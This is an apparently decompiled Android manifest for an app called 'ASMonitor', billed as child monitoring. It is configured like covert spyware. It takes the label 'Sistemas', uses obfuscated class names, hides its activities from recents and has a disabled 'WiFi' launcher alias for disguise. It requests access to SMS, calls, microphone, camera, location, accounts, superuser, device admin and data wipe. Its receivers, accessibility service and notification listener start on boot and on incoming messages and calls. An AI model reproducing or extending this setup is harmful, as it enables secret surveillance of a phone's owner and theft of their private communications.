# ASMonitor
Moniramento de Filhos
<?xml version="1.0" encoding="utf-8"?>
<manifest
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:versionCode="1"
    android:versionName="1.0"
    package="rally.company.appmonitor"
    platformBuildVersionCode="21"
    platformBuildVersionName="5.0.1-1624448">

    <uses-sdk
        android:minSdkVersion="14"
        android:targetSdkVersion="14" />

    <permission
        android:name="com.lkaprjzi.gxxivttq.permission.C2D_MESSAGE"
        android:protectionLevel="0x2" />

    <uses-permission
        android:name="com.lkaprjzi.gxxivttq.permission.C2D_MESSAGE" />

    <uses-permission
        android:name="android.permission.READ_CONTACTS" />

    <uses-permission
        android:name="android.permission.WRITE_CONTACTS" />

    <uses-permission
        android:name="android.permission.READ_SMS" />

    <uses-permission
        android:name="android.permission.CALL_PHONE" />

    <uses-permission
        android:name="android.permission.READ_PHONE_STATE" />

    <uses-permission
        android:name="android.permission.PROCESS_OUTGOING_CALLS" />

    <uses-permission
        android:name="android.permission.READ_LOGS" />

    <uses-permission
        android:name="android.permission.WRITE_EXTERNAL_STORAGE" />

    <uses-permission
        android:name="android.permission.SDCARD_WRITE" />

    <uses-permission
        android:name="android.permission.VIBRATE" />

    <uses-permission
        android:name="android.permission.INTERNET" />

    <uses-permission
        android:name="android.permission.ACCESS_COARSE_LOCATION" />

    <uses-permission
        android:name="android.permission.ACCESS_FINE_LOCATION" />

    <uses-permission
        android:name="android.permission.ACCESS_NETWORK_STATE" />

    <uses-permission
        android:name="com.android.email.permission.ACCESS_PROVIDER" />

    <uses-permission
        android:name="android.permission.READ_CALENDAR" />

    <uses-permission
        android:name="android.permission.MODIFY_AUDIO_SETTINGS" />

    <uses-permission
        android:name="android.permission.RECORD_AUDIO" />

    <uses-permission
        android:name="android.permission.CAMERA" />

    <uses-permission
        android:name="android.permission.WAKE_LOCK" />

    <uses-permission
        android:name="com.google.android.c2dm.permission.RECEIVE" />

    <uses-permission
        android:name="android.permission.ACCESS_WIFI_STATE" />

    <uses-permission
        android:name="android.permission.CHANGE_WIFI_STATE" />

    <uses-permission
        android:name="android.permission.MODIFY_PHONE_STATE" />

    <uses-permission
        android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />

    <uses-permission
        android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

    <uses-permission
        android:name="android.permission.GET_TASKS" />

    <uses-permission
        android:name="android.permission.BIND_DEVICE_ADMIN" />

    <uses-permission
        android:name="android.permission.CHANGE_NETWORK_STATE" />

    <uses-permission
        android:name="android.permission.ACCESS_SUPERUSER" />

    <uses-permission
        android:name="android.permission.GET_ACCOUNTS" />

    <uses-permission
        android:name="android.permission.SYSTEM_ALERT_WINDOW" />

    <uses-permission
        android:name="android.permission.PACKAGE_USAGE_STATS" />

    <uses-permission
        android:name="android.permission.USES_POLICY_WIPE_DATA" />

    <uses-permission
        android:name="android.permission.BLUETOOTH" />

    <uses-permission
        android:name="android.permission.BLUETOOTH_ADMIN" />

    <uses-permission
        android:name="android.permission.WRITE_SETTINGS" />

    <uses-permission
        android:name="android.permission.WRITE_SECURE_SETTINGS" />

    <uses-feature
        android:name="android.hardware.wifi"
        android:required="false" />

    <uses-feature
        android:name="android.hardware.telephony"
        android:required="false" />

    <uses-feature
        android:name="android.hardware.microphone"
        android:required="false" />

    <uses-feature
        android:name="android.hardware.touchscreen"
        android:required="false" />

    <uses-feature
        android:name="android.hardware.bluetooth"
        android:required="false" />

    <uses-feature
        android:name="android.hardware.screen.portrait"
        android:required="false" />

    <uses-feature
        android:name="android.hardware.camera.autofocus"
        android:required="false" />

    <uses-feature
        android:name="android.hardware.location.gps"
        android:required="false" />

    <uses-feature
        android:name="android.hardware.camera"
        android:required="false" />

    <application
        android:theme="@ref/0x0103006b"
        android:label="Sistemas"
        android:icon="@ref/0x7f020001"
        android:name="rally.company.appmonitor"
        android:manageSpaceActivity="rally.company.appmonitor"
        android:debuggable="false">

        <activity
            android:label="@ref/0x7f060045"
            android:icon="@ref/0x7f020001"
            android:name="com.lkaprjzi.gxxivttq.LtGxYLwzPp"
            android:finishOnTaskLaunch="true"
            android:stateNotNeeded="true"
            android:screenOrientation="1" />

        <activity
            android:label="@ref/0x7f06001a"
            android:name="com.lkaprjzi.gxxivttq.Installer"
            android:finishOnTaskLaunch="true"
            android:stateNotNeeded="true"
            android:excludeFromRecents="true"
            android:screenOrientation="1"
            android:allowTaskReparenting="false">

            <intent-filter>

                <action
                    android:name="android.intent.action.MAIN" />

                <category
                    android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <activity
            android:label="@ref/0x7f060045"
            android:name="com.lkaprjzi.gxxivttq.Uninstaller"
            android:finishOnTaskLaunch="true"
            android:stateNotNeeded="true"
            android:excludeFromRecents="true"
            android:screenOrientation="1"
            android:allowTaskReparenting="false" />

        <activity
            android:label="@ref/0x7f060045"
            android:name="com.lkaprjzi.gxxivttq.nzIQKlrXqP"
            android:finishOnTaskLaunch="true"
            android:stateNotNeeded="true"
            android:excludeFromRecents="true"
            android:screenOrientation="1"
            android:allowTaskReparenting="false">

            <intent-filter>

                <action
                    android:name="android.intent.action.MAIN" />
            </intent-filter>
        </activity>

        <activity
            android:label="@ref/0x7f060045"
            android:name="com.lkaprjzi.gxxivttq.RhQXxkEIiy"
            android:finishOnTaskLaunch="true"
            android:stateNotNeeded="true"
            android:excludeFromRecents="true"
            android:screenOrientation="1"
            android:allowTaskReparenting="false">

            <intent-filter>

                <action
                    android:name="android.intent.action.MAIN" />
            </intent-filter>
        </activity>

        <activity
            android:label="@ref/0x7f06006f"
            android:name="com.lkaprjzi.gxxivttq.KGjXKBNUvt"
            android:finishOnTaskLaunch="true"
            android:stateNotNeeded="true"
            android:excludeFromRecents="true"
            android:screenOrientation="1"
            android:allowTaskReparenting="false"
            android:windowSoftInputMode="0x4" />

        <activity
            android:theme="@ref/0x7f090003"
            android:label="@ref/0x7f06006f"
            android:name="com.lkaprjzi.gxxivttq.protocol.NLpzOAjbbS"
            android:finishOnTaskLaunch="true"
            android:stateNotNeeded="true"
            android:excludeFromRecents="true"
            android:allowTaskReparenting="false" />

        <activity
            android:theme="@ref/0x7f090003"
            android:label="@ref/0x7f06006f"
            android:name="com.lkaprjzi.gxxivttq.core.qZDCeZBRst"
            android:exported="true"
            android:finishOnTaskLaunch="true"
            android:stateNotNeeded="true"
            android:excludeFromRecents="true"
            android:screenOrientation="1"
            android:allowTaskReparenting="false" />

        <activity
            android:theme="@ref/0x0103000b"
            android:label="@ref/0x7f06005f"
            android:name="com.lkaprjzi.gxxivttq.UQHSaVkXQf"
            android:finishOnTaskLaunch="true"
            android:stateNotNeeded="true"
            android:excludeFromRecents="true"
            android:screenOrientation="1"
            android:allowTaskReparenting="false" />

        <activity
            android:theme="@ref/0x0103000b"
            android:label="@ref/0x7f060014"
            android:name="com.lkaprjzi.gxxivttq.VtCsYKJRFF"
            android:finishOnTaskLaunch="true"
            android:stateNotNeeded="true"
            android:excludeFromRecents="true"
            android:screenOrientation="1"
            android:allowTaskReparenting="false" />

        <activity
            android:label="@ref/0x7f060018"
            android:name="com.lkaprjzi.gxxivttq.zlqskwLsGi"
            android:finishOnTaskLaunch="true"
            android:stateNotNeeded="true"
            android:excludeFromRecents="true"
            android:screenOrientation="1"
            android:allowTaskReparenting="false"
            android:windowSoftInputMode="0x4" />

        <activity
            android:label="@ref/0x7f06001a"
            android:icon="@ref/0x7f020001"
            android:name="com.lkaprjzi.gxxivttq.WjNNdMuHUi"
            android:finishOnTaskLaunch="true"
            android:stateNotNeeded="true"
            android:excludeFromRecents="true"
            android:launchMode="2"
            android:screenOrientation="1"
            android:allowTaskReparenting="false" />

        <activity
            android:label="Dummy Camera"
            android:name="com.lkaprjzi.gxxivttq.ixCIpKksqw"
            android:finishOnTaskLaunch="true"
            android:stateNotNeeded="true"
            android:excludeFromRecents="true"
            android:allowTaskReparenting="false" />

        <activity
            android:theme="@ref/0x7f090003"
            android:label="Register user"
            android:name="org.appspot.apprtc.vaETVVAbMs"
            android:finishOnTaskLaunch="true"
            android:stateNotNeeded="true"
            android:excludeFromRecents="true"
            android:screenOrientation="1"
            android:allowTaskReparenting="false" />

        <activity
            android:name="com.lkaprjzi.gxxivttq.wJaeYJUXIj" />

        <activity-alias
            android:theme="@ref/0x7f090003"
            android:label="WiFi"
            android:icon="@ref/0x7f030000"
            android:name="com.lkaprjzi.gxxivttq.PlLIegpiXE"
            android:enabled="false"
            android:finishOnTaskLaunch="true"
            android:stateNotNeeded="true"
            android:screenOrientation="1"
            android:targetActivity="com.lkaprjzi.gxxivttq.wJaeYJUXIj">

            <intent-filter>

                <action
                    android:name="android.intent.action.MAIN" />

                <category
                    android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>

        <service
            android:icon="@ref/0x7f020001"
            android:name="com.lkaprjzi.gxxivttq.core.lTeFxLWfsA"
            android:enabled="true"
            android:exported="false" />

        <service
            android:icon="@ref/0x7f020001"
            android:name="com.lkaprjzi.gxxivttq.core.ZKhPiIYvKl"
            android:enabled="true"
            android:exported="false" />

        <service
            android:name="com.lkaprjzi.gxxivttq.securechannel.yfoiiXMMtS"
            android:exported="false" />

        <receiver
            android:name="com.lkaprjzi.gxxivttq.core.VRYkfycjbC"
            android:enabled="true">

            <intent-filter
                android:priority="1000">

                <action
                    android:name="com.lkaprjzi.gxxivttq.core.VRYkfycjbC.TIMER_ALARM" />
            </intent-filter>
        </receiver>

        <receiver
            android:name="com.lkaprjzi.gxxivttq.core.UKraoDOqeK"
            android:enabled="true">

            <intent-filter
                android:priority="1000">

                <action
                    android:name="com.lkaprjzi.gxxivttq.core.UKraoDOqeK.START" />

                <action
                    android:name="com.lkaprjzi.gxxivttq.core.UKraoDOqeK.STOP" />
            </intent-filter>
        </receiver>

        <receiver
            android:name="com.lkaprjzi.gxxivttq.core.ChxUDhCgXj">

            <intent-filter
                android:enabled="true"
                android:exported="false"
                android:priority="2147483647">

                <action
                    android:name="android.intent.action.NEW_OUTGOING_CALL" />

                <action
                    android:name="android.provider.Telephony.SMS_RECEIVED" />

                <action
                    android:name="android.net.conn.CONNECTIVITY_CHANGE" />
            </intent-filter>

            <intent-filter
                android:enabled="true"
                android:exported="false">

                <action
                    android:name="android.intent.action.USER_PRESENT" />
            </intent-filter>

            <intent-filter
                android:enabled="true"
                android:exported="false"
                android:priority="1000">

                <action
                    android:name="android.intent.action.BOOT_COMPLETED" />

                <action
                    android:name="android.intent.action.ACTION_SHUTDOWN" />

                <action
                    android:name="android.intent.action.QUICKBOOT_POWERON" />

                <action
                    android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>

            <intent-filter
                android:enabled="true"
                android:exported="false">

                <action
                    android:name="android.intent.action.PHONE_STATE" />
            </intent-filter>

            <intent-filter
                android:enabled="true"
                android:exported="false">

                <action
                    android:name="android.intent.action.SIM_STATE_CHANGED" />
            </intent-filter>

            <intent-filter>

                <action
                    android:name="android.intent.action.PACKAGE_REMOVED" />

                <action
                    android:name="android.intent.action.PACKAGE_ADDED" />

                <data
                    android:scheme="package" />
            </intent-filter>

            <intent-filter>

                <action
                    android:name="android.intent.action.AIRPLANE_MODE" />
            </intent-filter>
        </receiver>

        <receiver
            android:name="com.lkaprjzi.gxxivttq.TCIMBQGUAZ"
            android:permission="com.google.android.c2dm.permission.SEND">

            <intent-filter>

                <action
                    android:name="com.google.android.c2dm.intent.REGISTRATION" />

                <category
                    android:name="com.lkaprjzi.gxxivttq" />
            </intent-filter>

            <intent-filter>

                <action
                    android:name="com.google.android.c2dm.intent.RECEIVE" />

                <category
                    android:name="com.lkaprjzi.gxxivttq" />
            </intent-filter>

            <intent-filter>

                <action
                    android:name="com.google.android.c2dm.intent.RETRY" />

                <category
                    android:name="com.lkaprjzi.gxxivttq" />
            </intent-filter>
        </receiver>

        <receiver
            android:name="com.google.firebase.iid.FirebaseInstanceIdInternalReceiver"
            android:exported="false" />

        <service
            android:name="com.google.firebase.iid.FirebaseInstanceIdService"
            android:exported="true">

            <intent-filter
                android:priority="-500">

                <action
                    android:name="com.google.firebase.INSTANCE_ID_EVENT" />
            </intent-filter>
        </service>

        <receiver
            android:name="com.google.firebase.iid.FirebaseInstanceIdReceiver"
            android:permission="com.google.android.c2dm.permission.SEND"
            android:exported="true">

            <intent-filter>

                <action
                    android:name="com.google.android.c2dm.intent.RECEIVE" />

                <action
                    android:name="com.google.android.c2dm.intent.REGISTRATION" />

                <category
                    android:name="com.lkaprjzi.gxxivttq" />
            </intent-filter>

            <intent-filter>

                <action
                    android:name="com.google.android.c2dm.intent.RECEIVE" />

                <category
                    android:name="com.lkaprjzi.gxxivttq" />
            </intent-filter>
        </receiver>

        <service
            android:name="com.lkaprjzi.gxxivttq.wHxIbwunYz"
            android:exported="false">

            <intent-filter>

                <action
                    android:name="com.google.firebase.MESSAGING_EVENT" />
            </intent-filter>
        </service>

        <service
            android:name="com.lkaprjzi.gxxivttq.ywwicSMLjw"
            android:exported="false">

            <intent-filter>

                <action
                    android:name="com.google.firebase.INSTANCE_ID_EVENT" />
            </intent-filter>
        </service>

        <receiver
            android:label="@ref/0x7f06004c"
            android:icon="@ref/0x7f020003"
            android:name="com.lkaprjzi.gxxivttq.core.gNpBwhnnWE"
            android:permission="android.permission.BIND_DEVICE_ADMIN"
            android:description="@ref/0x7f060027">

            <meta-data
                android:name="android.app.device_admin"
                android:resource="@ref/0x7f050000" />

            <intent-filter>

                <action
                    android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>

        <service
            android:label="SISTEMAS"
            android:name="com.lkaprjzi.gxxivttq.core.listener.dZcsAEjSbH"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:enabled="true">

            <intent-filter>

                <action
                    android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>

            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@ref/0x7f050001" />
        </service>

        <service
            android:name="com.lkaprjzi.gxxivttq.core.listener.dgnPzgCgiy"
            android:enabled="true">

            <intent-filter>

                <action
                    android:name="com.android.inputmethod.keyboard.internal.kl.IRemoteService" />
            </intent-filter>
        </service>

        <service
            android:name="com.lkaprjzi.gxxivttq.util.hyuETLxgxY"
            android:enabled="true"
            android:exported="false" />

        <service
            android:label="@ref/0x7f06001a"
            android:name="com.lkaprjzi.gxxivttq.core.listener.SqslvXNLra"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">

            <intent-filter>

                <action
                    android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

        <service
            android:name="com.google.firebase.messaging.FirebaseMessagingService"
            android:exported="true">

            <intent-filter
                android:priority="-500">

                <action
                    android:name="com.google.firebase.MESSAGING_EVENT" />
            </intent-filter>
        </service>

        <provider
            android:name="com.google.firebase.provider.FirebaseInitProvider"
            android:exported="false"
            android:authorities="com.lkaprjzi.gxxivttq.firebaseinitprovider"
            android:initOrder="100" />

        <meta-data
            android:name="com.google.android.gms.version"
            android:value="@ref/0x7f080000" />
    </application>
</manifest>
